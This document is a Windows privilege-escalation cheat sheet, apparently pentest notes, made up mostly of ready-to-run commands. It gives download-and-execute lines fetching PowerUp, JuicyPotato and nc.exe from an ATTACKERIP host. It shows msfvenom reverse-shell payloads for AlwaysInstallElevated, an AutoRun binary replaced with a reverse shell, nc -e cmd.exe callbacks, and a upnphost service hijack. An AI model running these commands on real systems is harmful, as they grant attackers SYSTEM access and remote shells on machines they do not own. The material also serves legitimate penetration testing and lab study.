## Enumeration

### WinPeas

https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/


```
Run all checks while avoiding time-consuming searches:
.\winPEASany.exe quiet cmd fast
winPEAS.exe -a
```
### SeatBelt
```
//system info
SeatBelt.exe system

// user info
SeatBelt.exe user
```

### PowerUP

https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

```
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKERIP/PowerUp.ps1');Invoke-AllChecks"
```

### MSF enumeration

```
//weak services permissions
exploit/windows/local/service_permissions

//Always installed elevated
exploit/windows/local/always_install_elevated

//Unattend
post/windows/gather/enum_unattend`
```
## Registry exploits

### Autorun

if you are able to write to an AutoRun executable, and are able to restart the system (or wait for it to be restarted) you may be able to escalate privileges.
```
 .\winPEASany.exe quiet applicationsinfo
 
 //or use requery
 reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
 
 //and then use accesschk.exe to verify the permissions on each one:
 
 .\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
 
 // exploit replace the exe with our reverse shell
 copy "C:\Program Files\Autorun Program\program.exe" C:\Temp
 copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\AutorunProgram\program.exe"
```

### AlwaysInstallElevated

```
// Use winPEAS to see if both registry values are set:
.\winPEASany.exe quiet windowscreds

// Alternatively, verify the values manually: (both should return 1)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

EXPLOITATION
// Create a new reverse shell with msfvenom, this time using the msi format, and save it with the .msi extension:

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f msi -o reverse.msi

//Copy the reverse.msi across to the Windows VM, start a listener on Kali, and run the installer to trigger the exploit:

msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```

## Exploits

### Juicy potato
https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe

Check if users has the following permissions `SeImpersonate` or `SeAssignPrimaryToken` using the following command:

```
whoami /priv
```
![image](4a4d96decced0b64fbb826574627e469.png)

ATTACKER MACHINE

```
nc -lvp 1340
```
VICTIM MACHINE
```
// Download juicy potato binary
certutil -urlcache -split -f http://ATTACKERIP/juicypotato.exe juicypotato.exe

//Download nc binary
certutil -urlcache -split -f http://ATTACKERIP/nc.exe nc.exe 

//Create a bat file that will later execute with juicy potato
echo c:\Users\Public\Documents\nc.exe -e cmd.exe ATTACKERIP 1340 > rev.bat

//call the revshell as system
juicypotato.exe -l 1340 -t * -p c:\Users\Public\Documents\rev.bat

```

### Windows XP SP1 is known to be vulnerable to PE in upnphost. 

```
VICTIM MACHINE
sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe YOUR_IP 1234 -e C:\WINDOWS\System32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc qc upnphost

// If it fails because of a missing dependency, run the following:
sc config SSDPSRV start= auto
net start SSDPSRV
net start upnphost

ATTACKER MACHINE
nc -lvpn 1234
```

### WINDOWS 10 before build 17134 (tested on 14393)

```
use windows/local/ms16_075_reflection_juicy
```
